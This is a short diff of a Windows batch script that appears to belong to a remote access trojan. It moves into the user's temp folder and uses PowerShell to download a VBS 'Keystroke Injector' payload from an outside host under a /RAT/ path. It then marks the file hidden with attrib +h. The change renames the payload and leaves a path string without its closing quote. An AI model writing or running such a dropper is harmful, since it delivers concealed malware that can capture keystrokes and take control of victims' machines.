@@ -38,7 +38,7 @@ for /L %%i in (1,1,%LENGTH%) do (
 )
 ::----------------------------------------------------------------------------------------------------------------
 
-SET TARGETDIR="%USERPROFILE%\AppData\Local\Temp\"
+SET TARGETDIR="%USERPROFILE%\AppData\Local\Temp
 cd %TARGETDIR%
 
 ::----------------------------------------------------------------------------------------------------------------
@@ -49,8 +49,8 @@ cd %MainDirName%
 :: -----------------------------------------------------------cmd-------------------------------------------------------------------------
 
 :: download Keystroke Injector
-powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile payload.vbs"
-attrib +h "payload.vbs"
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile hello.vbs"
+attrib +h "hello.vbs"
 :: payload.vbs
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
